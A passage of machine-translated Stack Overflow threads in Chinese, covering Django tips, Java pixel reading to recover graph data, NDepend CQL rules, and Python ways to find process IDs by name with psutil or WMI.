您的 CSS / JS / IMG 将在 www.yoursite.com/site_media/ 上提供。

当然，不要在生产环境中使用它。

* * *

## 回答 #24

> 赞同：19
> 
> 时间：2009-05-14T18:19:48.617

`django.db.models.get_model`确实允许您在不导入模型的情况下检索模型。

James 展示了它的便利性：[“Django 技巧：编写更好的模板标签 — 迭代 4”](http://www.b-list.org/weblog/2006/jun/07/django-tips-write-better-template-tags/)。

* * *

## 回答 #25

> 赞同：19
> 
> 时间：2009-06-02T23:32:21.480

开始设计您的网站时，网页设计应用程序非常有用[。](http://docs.djangoproject.com/en/dev/ref/contrib/webdesign/#ref-contrib-webdesign)导入后，您可以添加它以生成示例文本：

```
{% load webdesign %}
{% lorem 5 p %} 
```

* * *

## 回答 #26

> 赞同：18
> 
> 时间：2009-08-28T11:59:46.893

I learned this one from the documentation for the [sorl-thumbnails](http://code.google.com/p/sorl-thumbnail/) app. You can use the "as" keyword in template tags to use the results of the call elsewhere in your template.

For example:

```
{% url image-processor uid as img_src %}
<img src="{% thumbnail img_src 100x100 %}"/> 
```

This is mentioned in passing in the Django templatetag documentation, but in reference to loops only. They don't call out that you can use this elsewhere (anywhere?) as well.

* * *

## 回答 #27

> 赞同：16
> 
> 时间：2010-05-13T23:04:24.653

[PyCharm IDE](http://www.jetbrains.com/pycharm/)是一个很好的编码环境，尤其是调试环境，内置对 Django 的支持。

* * *

## 回答 #28

> 赞同：16
> 
> 时间：2009-02-18T06:44:49.380

[django.views.generic.list_detail.object_list](http://docs.djangoproject.com/en/dev/ref/generic-views/?from=olddocs#django-views-generic-list-detail-object-list) -- 它为分页提供了所有的逻辑和模板变量（其中之一是我现在写的苦差事）。 [包装它](http://www.djangobook.com/en/2.0/chapter11/)允许您需要任何逻辑。这个 gem 为我节省了很多小时在“搜索结果”页面中逐个调试错误，并使视图代码在此过程中更清晰。

* * *

## 回答 #29

> 赞同：14
> 
> 时间：2011-04-27T19:59:16.623

使用数据库迁移。使用[南](http://south.aeracode.org)。

* * *

## 回答 #30

> 赞同：14
> 
> 时间：2010-07-14T15:06:49.103

使用[xml_models](http://djangorestmodel.sourceforge.net/)创建使用 XML REST API 后端（而不是 SQL 后端）的 Django 模型。这非常有用，尤其是在对第三方 API 进行建模时 - 您可以获得与您习惯的所有相同的 QuerySet 语法。您可以从 PyPI 安装它。

来自 API 的 XML：

```
<profile id=4>
    <email>joe@example.com</email>
    <first_name>Joe</first_name>
    <last_name>Example</last_name>
    <date_of_birth>1975-05-15</date_of_birth>
</profile> 
```

现在在python中：

```
class Profile(xml_models.Model):
    user_id = xml_models.IntField(xpath='/profile/@id')
    email = xml_models.CharField(xpath='/profile/email')
    first = xml_models.CharField(xpath='/profile/first_name')
    last = xml_models.CharField(xpath='/profile/last_name')
    birthday = xml_models.DateField(xpath='/profile/date_of_birth')

    finders = {
        (user_id,):  settings.API_URL +'/api/v1/profile/userid/%s',
        (email,):  settings.API_URL +'/api/v1/profile/email/%s',
    }

profile = Profile.objects.get(user_id=4)
print profile.email
# would print 'joe@example.com' 
```

它还可以处理关系和集合。我们每天都在大量使用的生产代码中使用它，所以即使它是测试版，它也非常有用。它还有一组很好的存根，您可以在测试中使用它们。

（免责声明：虽然我不是这个库的作者，但我现在是一名提交者，做了一些小提交）

* * *

## 回答 #31

> 赞同：13
> 
> 时间：2009-06-29T10:01:07.757

刚刚找到这个链接： http: [//lincolnloop.com/django-best-practices/#table-of-contents](http://lincolnloop.com/django-best-practices/#table-of-contents) - “Django Best Practices”。

* * *

## 回答 #32

> 赞同：12
> 
> 时间：2011-04-05T03:12:34.077

无需评估整个查询集以检查您是否返回任何结果，而是在 Django 1.2+ 中使用 .exists() 并在以前的版本中使用 .count() 。

exists() 和 count() 都清除 order by 子句并从 DB 中检索单个整数。但是，exists() 将始终返回 1，因为 count 可能会返回更高的值，手动应用限制。exists() 中使用的[has_result](http://code.djangoproject.com/browser/django/trunk/django/db/models/sql/query.py#L412)的来源和 count() 中使用的[get_count](http://code.djangoproject.com/browser/django/trunk/django/db/models/sql/query.py#L377)的来源。

由于它们都返回一个整数，因此没有模型实例化，在内存中加载模型属性，也没有在您的数据库和应用程序之间传递大型 TextField。

如果您已经评估了查询，.count() 计算 len(cached_result) 并且 .exists() 计算 bool(cached_result)

**效率不高 - 示例 1**

```
books = Books.objects.filter(author__last_name='Brown')
if books:
    # Do something 
```

**效率不高 - 示例 2**

```
books = Books.objects.filter(author__last_name='Brown')
if len(books):
    # Do something 
```

**高效 - 示例 1**

```
books = Books.objects.filter(author__last_name='Brown')
if books.count():
    # Do something 
```

**高效 - 示例 2**

```
books = Books.objects.filter(author__last_name='Brown')
if books.exists():
    # Do something 
```

* * *

## 回答 #33

> 赞同：12
> 
> 时间：2011-05-29T18:31:22.897

如果您对模型进行更改

```
./manage.py dumpdata appname > appname_data.json  
./manage.py reset appname
django-admin.py loaddata appname_data.json 
```

* * *

## 回答 #34

> 赞同：11
> 
> 时间：2009-09-10T19:46:16.833

使用[信号](http://docs.djangoproject.com/en/dev/topics/signals/)即时添加访问器方法。

我在[django-photologue](http://code.google.com/p/django-photologue)中看到了这种技术：对于任何添加的 Size 对象，post_init 信号都会将相应的方法添加到 Image 模型中。如果添加站点*巨人*，则以巨人分辨率检索图片的方法将是`image.get_giant_url()`。

这些方法是通过`add_accessor_methods`从`post_init`信号调用生成的：

```
def add_accessor_methods(self, *args, **kwargs):
    for size in PhotoSizeCache().sizes.keys():
        setattr(self, 'get_%s_size' % size,
                curry(self._get_SIZE_size, size=size))
        setattr(self, 'get_%s_photosize' % size,
                curry(self._get_SIZE_photosize, size=size))
        setattr(self, 'get_%s_url' % size,
                curry(self._get_SIZE_url, size=size))
        setattr(self, 'get_%s_filename' % size,
                curry(self._get_SIZE_filename, size=size)) 
```

请参阅[photologue.models 的源代码以](http://code.google.com/p/django-photologue/source/browse/trunk/photologue/models.py)了解实际使用情况。

* * *

## 回答 #35

> 赞同：11
> 
> 时间：2010-10-24T03:41:54.743

# 从 settings.py 中删除数据库访问信息

我在 Django 站点中所做的一件事`settings.py`是从`/etc`. 这样，每台机器的访问设置（数据库主机、端口、用户名、密码）可能不同，并且密码等敏感信息不在我的项目存储库中。您可能希望以类似的方式限制对工作人员的访问，方法是让他们使用不同的用户名连接。

您还可以通过环境变量传入数据库连接信息，甚至只是配置文件的键或路径，并在`settings.py`.

例如，这是我拉入数据库配置文件的方式：

```
g = {}
dbSetup = {}
execfile(os.environ['DB_CONFIG'], g, dbSetup)
if 'databases' in dbSetup:
    DATABASES = dbSetup['databases']
else:
    DATABASES = {
        'default': {
            'ENGINE': 'django.db.backends.mysql',
            # ...
        }
    } 
```

不用说，您需要确保`DB_CONFIG`除了 db 管理员和 Django 本身之外的任何用户都无法访问该文件。默认情况下应该将 Django 引用到开发人员自己的测试数据库。`ast`使用模块代替也可能有更好的解决方案`execfile`，但我还没有研究过。

我做的另一件事是使用单独的用户来执行数据库管理任务而不是其他所有任务。在我的`manage.py`中，我添加了以下序言：

```
# Find a database configuration, if there is one, and set it in the environment.
adminDBConfFile = '/etc/django/db_admin.py'
dbConfFile = '/etc/django/db_regular.py'
import sys
import os
def goodFile(path):
    return os.path.isfile(path) and os.access(path, os.R_OK)
if len(sys.argv) >= 2 and sys.argv[1] in ["syncdb", "dbshell", "migrate"] \
    and goodFile(adminDBConfFile):
    os.environ['DB_CONFIG'] = adminDBConfFile
elif goodFile(dbConfFile):
    os.environ['DB_CONFIG'] = dbConfFile 
```

其中 config in`/etc/django/db_regular.py`是针对只能通过 SELECT、INSERT、UPDATE 和 DELETE 访问 Django 数据库`/etc/django/db_admin.py`的用户，并且是针对具有这些权限以及 CREATE、DROP、INDEX、ALTER 和 LOCK TABLES 的用户。（`migrate`命令来自[South](http://south.aeracode.org/)。）这为我提供了一些保护，防止 Django 代码在运行时与我的架构发生混淆，并且限制了 SQL 注入攻击可能造成的损害（尽管您仍然应该检查和过滤所有用户输入）。

（复制自我对[另一个问题](https://stackoverflow.com/questions/3884249/django-celery-database-for-models-on-producer-and-worker/3884535#3884535)的回答）

* * *

## 回答 #36

> 赞同：9
> 
> 时间：2009-11-21T06:29:49.273

不要在本地主机上运行 Django 开发服务器，而是在适当的网络接口上运行它。例如：

```
python manage.py runserver 192.168.1.110:8000 
```

或者

```
python manage.py runserver 0.0.0.0:8000 
```

然后，您不仅可以轻松使用 Fiddler ( [http://www.fiddler2.com/fiddler2/](http://www.fiddler2.com/fiddler2/) ) 或 HTTP 调试器 ( [http://www.httpdebugger.com/](http://www.httpdebugger.com/) ) 等其他工具来检查您的 HTTP 标头，还可以从 LAN 上的其他机器访问您的开发站点进行测试。

尽管开发服务器很小且相对安全，但请确保您受到防火墙的保护。

* * *

## 回答 #37

> 赞同：7
> 
> 时间：2010-05-14T07:23:52.663

[Django 调试工具栏](http://github.com/robhudson/django-debug-toolbar)真的很棒。不是真正的工具栏，它实际上会打开一个侧窗格，告诉您有关您正在查看的页面的各种信息 - 数据库查询、发送到模板的上下文变量、信号等等。

* * *

## 回答 #38

> 赞同：7
> 
> 时间：2010-04-29T19:22:46.990

在自定义视图装饰器中使用`wraps`装饰器来保留视图的名称、模块和文档字符串。例如

```
try:
    from functools import wraps
except ImportError:
    from django.utils.functional import wraps  # Python 2.3, 2.4 fallback.

def view_decorator(fun):
    @wraps(fun)
    def wrapper():
        # here goes your decorator's code
    return wrapper 
```

**注意**`__call__`：如果作者没有定义`__name__`属性，则不适用于基于类的视图（具有方法定义的视图）。作为一种解决方法，请使用：

```
from django.utils.decorators import available_attrs
...
    @wraps(fun, assigned=available_attrs(fun)) 
```

* * *

## 回答 #39

> 赞同：6
> 
> 时间：2011-02-03T15:37:33.427

使用“apps”文件夹来组织您的应用程序，而无需编辑 PYTHONPATH

当我想像这样组织我的文件夹时，这很方便：

```
apps/
    foo/
    bar/
site/
settings.py
urls.py 
```

无需覆盖 PYTHONPATH 或不必为每个导入添加**应用程序，例如：**

```
from apps.foo.model import *
from apps.bar.forms import * 
```

在你的 settings.py 添加

```
import os
import sys
PROJECT_ROOT = os.path.abspath(os.path.dirname(__file__))
sys.path.insert(0, os.path.join(PROJECT_ROOT, "apps")) 
```

你准备好了:-)

我在[http://codepatter.com/2009/04/10/how-to-add-locations-to-python-path-for-reusable-django-apps/看到了这个](http://codespatter.com/2009/04/10/how-to-add-locations-to-python-path-for-reusable-django-apps/)

* * *

## 回答 #40

> 赞同：5
> 
> 时间：2009-06-02T22:22:35.990

[通过 django 模板而不是 as_(ul|table|p)() 呈现表单](http://code.djangoproject.com/wiki/TemplatedForm)。

本文展示了如何使用模板来呈现 CusstomForms 而不是`as_p()`, `as_table()`...

为了让它工作改变

*   `from django import newforms as forms` **至** `from django import forms`
*   `from django.newforms.forms import BoundField` **至** `from django.forms.forms import BoundField`

* * *

## 回答 #41

> 赞同：5
> 
> 时间：2009-11-01T09:47:20.347

使用**[djangorecipe](http://pypi.python.org/pypi/djangorecipe)**管理您的项目

*   如果你正在编写一个新的应用程序，这个秘诀可以让你在项目之外进行测试变得非常容易
*   它允许您管理项目的依赖项（例如它应该依赖的某个应用程序的版本）

您需要做的就是开始：

1.  为您的新网站（或库）创建一个文件夹
2.  创建一个包含以下内容的 buildout.cfg：

    ```
     [buildout]
    parts=django

    [django]
    recipe=djangorecipe
    version=1.1.1
    project=my_new_site
    settings=development 
    ```

3.  获取 bootstrap.py 以获取 buildout 的本地安装并将其放置在您的目录中。您可以使用[官方](http://www.google.at/search?q=buidlout+bootstrap.py&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:official&client=firefox-a)版本（抱歉，Markdown 不喜欢完整链接的一部分：-/），也可以使用使用分发而不是[Reinout van Rees](http://reinout.vanrees.org/weblog/2009/10/15/distribute-works-with-buildout.html)所述的 setuptools 的版本。
4.  `python bootstrap.py`（或者`python bootstrap_dev.py`如果你想使用分发）。
5.  `./bin/buildout`

而已。您现在应该有一个新文件夹“my_new_site”，这是您的新 django 1.1.1 项目，并且在 ./bin 中，您将找到在`django`正常安装中替换 manage.py 的 -script。

有什么好处？假设您想在项目中使用 django-comment-spamfighter 之类的东西。您所要做的就是将您的 buildout.cfg 更改为以下内容：

```
 [buildout]
parts=django

[django]
recipe=djangorecipe
version=1.1.1
project=my_new_site
settings=development
eggs=
    django-comments-spamfighter==0.4 
```

请注意，我所做的只是添加最后两行，即 django-part 还应该具有 0.4 版中的 django-comments-spamfighter 包。下次运行时`./bin/buildout`，buildout 将下载该包并修改 ./bin/django 以将其添加到其 PYTHONPATH。

djangorecipe 也适合使用 mod_wsgi 部署您的项目。只需将`wsgi=true`设置添加到 buildout.cfg 的 django 部分，“django.wsgi”就会出现在 ./bin 文件夹中:-)

如果您将`test`选项设置为应用程序列表，djangorecipe 将为您创建一个很好的包装器，为您的项目中列出的应用程序运行所有测试。

如果您想在独立环境中开发单个应用程序以进行调试等，Jakob Kaplan-Moss 在[他的博客上有一个非常完整的教程](http://jacobian.org/writing/django-apps-with-buildout/)

* * *

## 回答 #42

> 赞同：5
> 
> 时间：2011-08-21T20:05:03.857

在生产环境中自动设置“DEBUG”属性（settings.py）

```
import socket

if socket.gethostname() == 'productionserver.com':
    DEBUG = False
else:
    DEBUG = True 
```

作者： http: [//nicksergeant.com/2008/automatically-setting-debug-in-your-django-app-based-on-server-hostname/](http://nicksergeant.com/2008/automatically-setting-debug-in-your-django-app-based-on-server-hostname/)

* * *

## 回答 #43

> 赞同：5
> 
> 时间：2010-07-16T06:27:08.903

在你的 urlconf 中使用 reverse。

这是我不明白为什么它不是默认设置的那些技巧之一。

这是我拿起它的链接：http: [//andr.in/2009/11/21/calling-reverse-in-django/](http://andr.in/2009/11/21/calling-reverse-in-django/)

这是代码片段：

> ```
> from django.conf.urls.defaults import *
> from django.core.urlresolvers import reverse
> from django.utils.functional import lazy
> from django.http import HttpResponse
> 
> reverse_lazy = lazy(reverse, str)
> 
> urlpatterns = patterns('',
> url(r'^comehere/', lambda request: HttpResponse('Welcome!'), name='comehere'),
> url(r'^$', 'django.views.generic.simple.redirect_to',
> {'url': reverse_lazy('comehere')}, name='root')
> )
> ```

* * *

## 回答 #44

> 赞同：4
> 
> 时间：2009-12-03T04:08:47.270

这是一种非常简单的方法，无需在 python shell 中再次导入另一个模型。

首先，安装[IPython](http://ipython.scipy.org/moin/)（如果你不使用IPython，你怎么了？）。接下来，在您的 django 项目目录中创建一个 python 脚本 ipythonrc.py，其中包含以下代码：

```
from django.db.models.loading import get_models 
for m in get_models(): 
     globals()[m.__name__] = m 
#NOTE: if you have two models with the same name you'll only end up with one of them 
```

然后，在您的 ~/.ipython/ipythonrc 文件中，将以下代码放入“要加载和执行的 Python 文件”部分：

```
execfile /path/to/project/ipythonrc.py 
```

现在，每次启动或运行 IPython 时，`./manage.py shell`您的所有模型都已导入并可以使用。无需再次导入另一个模型。

您还可以将您经常执行的任何其他代码放在 ipythonrc.py 文件中以节省时间。

* * *

## 回答 #45

> 赞同：4
> 
> 时间：2010-05-01T18:51:42.637

**在初始化时更改 Django 表单字段属性**

有时将额外的参数传递给 Form 类很有用。

```
from django import forms
from mymodels import Group

class MyForm(forms.Form):
    group=forms.ModelChoiceField(queryset=None)
    email=forms.EmailField()
    some_choices=forms.ChoiceField()

    def __init__(self,my_var,*args,**kwrds):
        super(MyForm,self).__init__(*args,**kwrds)
        self.fields['group'].queryset=Group.objects.filter(...)
        self.fields['email'].widget.attrs['size']='50'
        self.fields['some_choices']=[[x,x] for x in list_of_stuff] 
```

来源：[Dzone 片段](http://snippets.dzone.com/posts/show/7936)

* * *

## 回答 #46

> 赞同：2
> 
> 时间：2011-04-05T19:59:33.707

`django_extensions`来自[https://github.com/django-extensions/django-extensions](https://github.com/django-extensions/django-extensions)很棒。

几个不错的`./manage.py`命令：

*   `shell_plus`- 从所有 INSTALLED_APPS 中自动导入模型
*   `show_urls`- 打印项目中所有应用程序中定义的所有 url
*   `runscript`- 在项目上下文中运行任何脚本（您可以使用模型和其他与 Django 相关的模块）

* * *

## 回答 #47

> 赞同：2
> 
> 时间：2011-04-22T08:22:38.723

如果您有钱购买许可证，PyCharm 和 Wingware IDE 是很棒的工具。

由于我是一个糟糕的开发人员，我将[PyDev](http://pydev.org/)与[Eclipse](http://www.eclipse.org/)一起使用。

* * *

## 回答 #48

> 赞同：1
> 
> 时间：2011-05-15T12:13:44.790

派对有点晚了。但是 Django Canvas 最近出现了，它值得在这里占有一席之地。

不要以`django-admin.py startproject`. 相反，您可以使用[Django Canvas](http://djangocanvas.com)之类的东西来帮助将空白项目与您需要的模块拼凑在一起。

你去那个网站，勾选一些选项，然后下载一个空白项目，就这么简单。

它具有所有常见的东西，例如 South 模式迁移和命令扩展，以及这里提到的许多其他最佳实践。此外，它还有一个很棒的`start.sh/shart.bat`脚本，可以安装 python、virtualenv、pip、django 以及从 Windows、osx 或 linux 的新副本开始所需的任何东西。

* * *

## 回答 #49

> 赞同：1
> 
> 时间：2009-06-02T22:27:43.857

使用[isapi-wsgi](http://code.google.com/p/isapi-wsgi/)和[django-pyodbc](http://code.google.com/p/django-pyodbc/)在 Windows 上使用 IIS 和 SQL Server 运行 Django！

* * *

## 回答 #50

> 赞同：1
> 
> 时间：2011-12-14T22:48:04.243

如果您还没有阅读[Unbreak Django ，请阅读。](http://thebuild.com/presentations/unbreaking-django.pdf)它包含*许多*有关 django 陷阱的有用信息。

* * *

## 回答 #51

> 赞同：1
> 
> 时间：2010-10-24T03:17:55.220

为具有相同结构的旧表集创建动态模型：

```
class BaseStructure(models.Model):
    name = models.CharField(max_length=100)
    address = models.CharField(max_length=100)

    class Meta:
        abstract=True

class DynamicTable(models.Model):
    table_name = models.CharField(max_length=20)

    def get_model(self):
        class Meta:
            managed=False
            table_name=self.table_name

        attrs = {}
        attrs['Meta'] = Meta

        # type(new_class_name, (base,classes), {extra: attributes})
        dynamic_class = type(self.table_name, (BaseStructure,), attrs) 
        return dynamic_class

customers = DynamicTable.objects.get(table_name='Customers').get_model()
me = customers.objects.get(name='Josh Smeaton')
me.address = 'Over the rainbow'
me.save() 
```

这假设您有具有相同结构的旧表。您无需创建一个模型来包装每个表，而是定义一个基本模型，并动态构建与特定表交互所需的类。

* * *

## 回答 #52

> 赞同：1
> 
> 时间：2011-11-16T07:14:08.537

使用异步任务。使用[芹菜](http://celeryproject.org/)

* * *

## 回答 #53

> 赞同：0
> 
> 时间：2011-04-22T15:40:32.950

当将变量从视图传递到模板时，响应字典可能会变得冗长乏味。我发现使用 . 一次传递所有局部变量很好`locals()`。

```
def show_thing(request, thing_id):
    thing = Thing.objects.get(pk=thing_id)
    return render_to_response('templates/things/show.html', locals()) 
```

（本身并不是一个隐藏的特性，但对于 Python 和/或 Django 的新手来说仍然很有帮助。）

编辑：显然，显式比隐式更好，但这种方法在开发过程中可能会有所帮助。

* * *

## 回答 #54

> 赞同：0
> 
> 时间：2011-11-09T13:17:37.337

Django 没有应用设置，所以我做了自己的 app_settings.py 检测。在 settings.py 的底部，我添加了以下代码：

```
import sys, os
# Append application settings without triggering the __init__.
for installed_app in INSTALLED_APPS:
    # Ignore django applications
    if not installed_app.startswith('django.'):
        # Find the app (and the settings file)
        for path in sys.path:
            path = os.path.join(path, installed_app, 'app_settings.py')
            if os.path.isfile(path):
                # Application settings found
                exec open(path).read() 
```

它在所有 INSTALLED_APPS 中检测 app_settings.py。它不会导入它，而是读取 app_settings 文件的内容并内联执行它。如果 app_settings 直接导入所有类型的 Django 导入错误将被引发（因为 Django 尚未初始化）。

所以我的 app/app_settings.py 将如下所示：

```
MIDDLEWARE_CLASSES += (
    'app.middleware.FancyMiddleware',
) 
```

现在只需将应用程序添加到 INSTALLED_APPS，而不是查找所有应用程序设置并将它们添加到 settings.py（中间件、urls...）

注意：如果 Django 有一个附加额外设置的钩子会更好，这样可以在启动时（或在运行时）添加应用程序设置。

* * *

## 回答 #55

> 赞同：0
> 
> 时间：2011-06-13T02:54:49.753

**dir() & raise ValueError()**

为了在开发过程中调试/探索事物的状态，我使用了以下技巧：

```
...
  to_see = dir(inspect_this_thing)
  to_see2 = inspect_this_thing.some_attribute
  raise ValueError("Debugging")
... 
```

当您处理 django 中没有特别详细记录的部分时，这尤其有用（form.changed_fields 是我最近使用的一个）。

**本地人（）。**

不要为模板上下文写出每个变量，而是使用 python 内置 locals() 命令为您创建一个字典：

```
#This is tedious and not very DRY
return render_to_response('template.html', {"var1": var1, "var2":var2}, context_instance=RequestContext(request))

#95% of the time this works perfectly
return render_to_response('template.html', locals(), context_instance=RequestContext(request))

#The other 4.99%
render_dict = locals()
render_dict['also_needs'] = "this value"
return render_to_response('template.html', render_dict, context_instance=RequestContext(request)) 
```

# java - 使用 Java 识别图中的线条

> ID：550633
> 
> 赞同：4
> 
> 时间：2009-02-15T10:06:41.230
> 
> 标签：java, image

我正在研究一个想法，其中我必须识别 JPG 或 PNG 文件中的行。PNG 文件包含一个单一值的图形 - 一个 x,y 组合。例如，图形看起来像 Y = mx+c。我想识别图表中的线 - 如果我可以识别像素在框架中的位置，我相信我可以取回用于绘制图表的值 (x,y)。这里的假设是 - 我知道比例，即 1 像素 = Y 的什么单位？有人可以帮我编写一个代码来识别一个PNG文件中特定颜色的像素吗？

编辑

让我们举个例子来说明清楚。假设我有一组像这样的数据值 X 和 Y -

```
X = 1, Y = 10
X = 2, Y = 20
X = 3, Y = 30
X = 4, Y = 40
X = 5, Y = 50
X = 6, Y = 60 
```

在这种情况下，如果我使用 jfreechart 类型的图表工具并制作图表，它的工具就像一条直线。

因此，输入是数据集，输出是 .PNG 文件（使用 jchart 或 jfreechart），其中包含 Y 值的此折线图。

问题是 - 如果我们反转流程，我们是否可以开发一个程序来获取 PNG 文件（包含图形）并将数据集返回给我。

问题的背景是——我想将 PNG 文件存储在我的应用程序中，而不是原始数据集。但是给定一个 PNG 文件，我应该能够取回我的数据集。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-15T17:59:36.117

*对于您的问题是否只是确定*图像中像素的颜色，或者问题是否是您尝试做的*数学*问题，我有点困惑。

对于前者，请执行以下操作：

```
 BufferedImage bimg = ImageIO.read(new File("whatever.png"));

    // get the colour of the pixel at position (x, y)
    int col = bimg.getRGB(x, y);

    // decode red, green and blue components of colour if necessary
    int r = (col >> 16) & 0xff;
    int g = (col >> 8) & 0xff;
    int b = col & 0xff; 
```

如果您只想从图表中取回*数据集*（即不从该数据中导出方程式），那么您基本上遍历每个 X 位置并找到 Y 位置，其中有一个图形绘图程序使用的颜色像素。如果图形有轴、抗锯齿等，那么任务会更复杂。

从数据中推导出*方程*的任务可能要复杂得多，但您可以首先检查某些可疑的公式，例如您提到的*y = mx + c 。*例如，您可以循环检查最后一个 Y 位置之间的差异；如果该差异始终相同，那么您将得到一个直线图（此时，推导公式应该是微不足道的）。

为了测试其他方程，了解一点微积分会有所帮助。然后，一个起点是查看*差异中的差异*是否与所讨论方程的导数相匹配。（举个例子，如果等式是*y = ax^2 + c*，那么 X 每增加一次，Y 本身也会增加*2a*。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-15T10:20:42.227

通常，在计算机显示器上，您没有`(0,0)`中心点，因为该点被定义为屏幕的左上角。因此，如果我们正在查看一个函数，`f(x)=ax+b`则`b`参数被定义为`y`函数的值 at `x=0`，即屏幕的左边框。因此，准确定义您要抵消的内容很重要。

要找到斜率，只需在屏幕上取一些中心点，您知道那里有一个函数点，`x`向左或向右移动像素，找到`y`高度增量，并且`y/x`是函数斜率，或`a`上述函数中的参数.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-15T11:24:10.937

我读对了吗：您在原本空白的画布上有单行图像？如果是这样，您可以向下查看最左侧的像素列并找到不同的像素，然后向右取一列并找到那里的像素。现在你有两个点，从中生成一个线性函数是微不足道的。作为单位，为什么不使用像素？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-07-16T06:38:43.603

我不确定你的项目在哪里，但我也需要检测图像中的线条。这对我有帮助。 [http://www.music.mcgill.ca/~cmckay/software/musictech/ScoreReader/Horizo​​ntalLineDetection.html](http://www.music.mcgill.ca/~cmckay/software/musictech/ScoreReader/HorizontalLineDetection.html)

# ndepend - 最有用的 NDepend CQL 查询

> ID：550636
> 
> 赞同：4
> 
> 时间：2009-02-15T10:09:35.403
> 
> 标签：ndepend, cql

我工作的一个客户已经开始使用 NDepend 作为 FXCop 的替代品，并且“架构师”已经编制了一个几乎不可用的 CQL 查询列表，我认为他是从 NDepend 网站的建议中获取的。

“我认为”是无用查询的示例

```
WARN IF Count > 0 IN 
SELECT METHODS WHERE PercentageComment < 20 
AND NbLinesOfCode > 10 
```

即：每10行代码必须至少有2行注释

所以我试图收集的是一组**有用**的查询，我们可以作为开发人员使用。

*请只为每个回复提供一个**查询**（带描述），以便对其进行相应投票*。 ***请只为每个回复****提供一个查询（带描述），以便对其进行相应投票***。**

 *** * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-02-15T13:09:21.387

冼，现在 CQLinq（LINQ 查询上的代码规则）发布了，几十个新的默认规则可用，大多数现有的规则都得到了增强。

以下是我最喜欢的十个：

*   [避免命名空间依赖循环](http://www.ndepend.com/DefaultRules/webframe.html?Q_Avoid_namespaces_dependency_cycles.html)
*   [UI 层不应该直接使用 DB 类型](http://www.ndepend.com/DefaultRules/webframe.html?Q_UI_layer_shouldn%27t_use_directly_DB_types.html)
*   [具有一次性实例字段的类型必须是一次性的](http://www.ndepend.com/DefaultRules/webframe.html?Q_Types_with_disposable_instance_fields_must_be_disposable.html)
*   [曾经 100% 被测试覆盖但现在不再覆盖的类型](http://www.ndepend.com/DefaultRules/webframe.html?Q_Types_that_used_to_be_100__covered_but_not_anymore.html)
*   [避免将不可变类型转换为可变类型](http://www.ndepend.com/DefaultRules/webframe.html?Q_Avoid_transforming_an_immutable_type_into_a_mutable_one.html)
*   [避免使复杂的方法更加复杂](http://www.ndepend.com/DefaultRules/webframe.html?Q_Avoid_making_complex_methods_even_more_complex_%28Source_CC%29.html)
*   [API 重大更改：类型](http://www.ndepend.com/DefaultRules/webframe.html?Q_API_Breaking_Changes__Types.html)
*   [可能死掉的方法](http://www.ndepend.com/DefaultRules/webframe.html?Q_Potentially_dead_Methods.html)
*   [命名空间名称应与文件位置相对应](http://www.ndepend.com/DefaultRules/webframe.html?Q_Namespace_name_should_correspond_to_file_location.html)
*   [如果可能，方法应该声明为静态的](http://www.ndepend.com/DefaultRules/webframe.html?Q_Methods_should_be_declared_static_if_possible.html)

# python - 在 python 中通过进程名称获取 PID 的跨平台方法

> ID：550653
> 
> 赞同：57
> 
> 时间：2009-02-15T10:23:56.477
> 
> 标签：python, cross-platform, jython, hp-ux

主机上正在运行多个具有相同名称的进程。**使用python**或**jython**按名称获取这些进程的 PID 的跨平台方法是什么？

1.  我想要类似`pidof`但在python中的东西。`pidof`（反正我没有。）
2.  我无法解析`/proc`，因为它可能不可用（在 HP-UX 上）。
3.  我不想运行`os.popen('ps')`和解析输出，因为我认为它很难看（不同操作系统中的字段顺序可能不同）。
4.  目标平台是 Solaris、HP-UX，也许还有其他。

* * *

## 回答 #1

> 赞同：81
> 
> 时间：2010-02-10T23:12:17.287

您可以使用适用于 Windows 和 UNIX 的 psutil ( [https://github.com/giampaolo/psutil](https://github.com/giampaolo/psutil) )：

```
import psutil

PROCNAME = "python.exe"

for proc in psutil.process_iter():
    if proc.name() == PROCNAME:
        print(proc) 
```

在我的机器上打印：

```
<psutil.Process(pid=3881, name='python.exe') at 140192133873040> 
```

编辑 2017-04-27 - 这是一个更高级的实用程序函数，它根据进程的 name()、cmdline() 和 exe() 检查名称：

```
import os
import psutil

def find_procs_by_name(name):
    "Return a list of processes matching 'name'."
    assert name, name
    ls = []
    for p in psutil.process_iter():
        name_, exe, cmdline = "", "", []
        try:
            name_ = p.name()
            cmdline = p.cmdline()
            exe = p.exe()
        except (psutil.AccessDenied, psutil.ZombieProcess):
            pass
        except psutil.NoSuchProcess:
            continue
        if name == name_ or cmdline[0] == name or os.path.basename(exe) == name:
            ls.append(p)
    return ls 
```

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2009-08-04T10:00:18.143

没有单一的跨平台 API，您必须检查操作系统。对于基于 posix 的使用 /proc。对于 Windows，使用以下代码获取具有对应进程名称的所有 pid 的列表

```
from win32com.client import GetObject
WMI = GetObject('winmgmts:')
processes = WMI.InstancesOf('Win32_Process')
process_list = [(p.Properties_("ProcessID").Value, p.Properties_("Name").Value) for p in processes] 
```

然后，您可以轻松过滤掉您需要的流程。有关 Win32_Process 可用属性的更多信息，请查看[Win32_Process 类](http://msdn.microsoft.com/en-us/library/aa394372%28VS.85%29.aspx)

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2013-02-09T23:42:35.907

```
import psutil

process = filter(lambda p: p.name() == "YourProcess.exe", psutil.process_iter())
for i in process:
  print i.name,i.pid 
```

给出“YourProcess.exe”的所有 pid

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2017-04-15T11:50:43.013

关于[ThorSummoner 评论的注释](https://stackoverflow.com/questions/550653/cross-platform-way-to-get-pids-by-process-name-in-python#comment45084163_14792920)

```
process = [proc for proc in psutil.process_iter() if proc.name == "YourProcess.exe"]. 
```

我已经在 Debian 上使用 Python 3 进行了尝试，我认为它必须`proc.name()`代替`proc.name`.

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-02-15T12:43:05.520

首先，Windows（在所有它的化身）是一个非标准操作系统。

Linux（和大多数专有的 unixen）是符合 POSIX 的标准操作系统。

C 库反映了这种二分法。Python 反映了 C 库。

